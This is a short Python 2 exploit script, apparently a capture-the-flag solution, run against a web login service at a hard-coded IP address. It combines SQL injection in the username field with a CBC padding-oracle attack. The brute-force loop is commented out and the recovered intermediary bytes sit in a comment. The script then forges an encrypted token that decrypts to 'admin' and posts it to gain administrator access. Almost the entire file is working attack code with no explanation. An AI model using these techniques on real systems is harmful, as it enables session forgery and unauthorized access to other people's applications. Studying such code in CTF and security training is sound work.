#! /usr/bin/env python
# -*- coding: utf-8 -*-
import base64
import requests
import urllib

url = "http://218.2.197.235:23737/"
cookie = {"PHPSESSID":"qe6s9hjkpqrfcv07hf1ous71m7"}  #祖传session
iv = base64.b64decode(urllib.unquote('pRbkrX1AWs2zEdmpXhpkyA%3D%3D'))  #token
cipher = base64.b64decode(urllib.unquote('cXo13C3pG6xhYV08AwncCw%3D%3D'))  #ID
dest_plain = "admin" + 11*chr(11)

def sxor(s1,s2):    #异或好函数
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

def foo(x):
	param={'username':"' union select 'kira','{}".format(x),'password':''}
	r = requests.post(url,data=param)
	# cookie['token'] = urllib.quote(x)
	# r = requests.get(url, cookies=cookie)
	return ('ctfer' not in r.content)

def padding(l,test):
    if l > 1:
        tmp = chr(test) + sxor(imtermediary,chr(l)*(l-1))
    else:
        tmp = chr(test)
    return "{:\x00>16}".format(tmp)


def make_ses(x):
    return base64.b64encode(x+cipher)

imtermediary = "" #4f4bb8ca6b0a6ff0ca0f27f48295d3e7
ptxt = "OrDinaryU5eR\x04\x04\x04\x04"  #OrDinaryU5eR\x04\x04\x04\x04

# for  i in range(16,17):
# 	for j in range(0,256):
# 		tmp = padding(i,j)
# 		print "[+] checking:{}".format(hex(j))
# 		if foo(make_ses(chr(0)*16+tmp)): #不加多16位\x00，会暴不出第一位,CBC加多16位0没问题
# 			imtermediary = chr(j ^ i) + imtermediary
# 			ptxt = sxor(imtermediary[::-1],iv[::-1])[::-1]
# 			print "[!] find:{}\t{}\t{}\t{}".format(imtermediary,imtermediary.encode('hex'),ptxt,ptxt.encode('hex'))
# 			break
print iv
cookie['token'] = base64.b64encode(sxor(ptxt,sxor(iv,dest_plain)))
print cookie
r = requests.post(url, cookies=cookie)
print r.content
